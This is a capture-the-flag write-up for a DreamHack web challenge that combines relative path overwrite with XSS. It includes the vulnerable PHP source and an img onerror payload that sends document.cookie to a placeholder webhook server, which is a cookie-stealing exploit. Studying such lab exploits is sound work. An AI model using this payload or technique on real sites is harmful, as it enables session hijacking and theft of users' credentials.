# Relative Path Overwrite Advanced — DreamHack

> **Room / Challenge:** Relative Path Overwrite Advanced (Web)

---

## Metadata

- **Author:** `jameskaois`
- **CTF:** DreamHack
- **Challenge:** Relative Path Overwrite Advanced (web)
- **Link**: `https://dreamhack.io/wargame/challenges/440`
- **Level:** `2`
- **Date:** `18-11-2025`

---

## Goal

Leveraging Relative Path Overwrite and XSS Scripting to force the bot sending the flag to you.

## My Solution

The app has the `vuln.php` where we can inject XSS Scripting:

```php
<script src="filter.js"></script>
<pre id=param></pre>
<script>
    var param_elem = document.getElementById("param");
    var url = new URL(window.location.href);
    var param = url.searchParams.get("param");
    if (typeof filter === 'undefined') {
        param = "nope !!";
    }
    else {
        for (var i = 0; i < filter.length; i++) {
            if (param.toLowerCase().includes(filter[i])) {
                param = "nope !!";
                break;
            }
        }
    }

    param_elem.innerHTML = param;
</script>
```

However it needs the `filter` to not undefined in order to run our param, currently `filter` is undefined by default:
![Guide image](./screenshots/1.png)
Here is the progress we have to do to exploit the app, first we have to set a `filter=[]` for the vuln page to prevent the `nope !!` of `filter === 'undefined'`, then force the bot to make a request to our server with the `document.cookie`.

To set `filter = []` in vuln page we can leverage the `404.php` page:

```php
<?php
    header("HTTP/1.1 200 OK");
    echo $_SERVER["REQUEST_URI"] . " not found.";
?>
```

When it is not found the server will echo the `REQUEST_URI`, so we can use this payload `;var filter=[]//` the `//` is to comment the ` not found.` behind:

```
/index.php/gm.php;var filter=[]//
```

Now create a payload to force the bot to send the cookie to our server:

```html
<img
  src="x"
  onerror="location='https://YOUR_SERVER/webhook?c='+document.cookie"
/>
```

Combine this we have the final payload to get the flag:

```
index.php/gm.php;filter=[];//?page=vuln&param=%3Cimg%20src=x%20onerror=location=%27https://YOUR_SERVER/webhook?c=%27%2bdocument.cookie%3E
```

By this we can define filter with empty array so there won't be any filter items, our img will be rendered.
![Guide image](./screenshots/2.png)
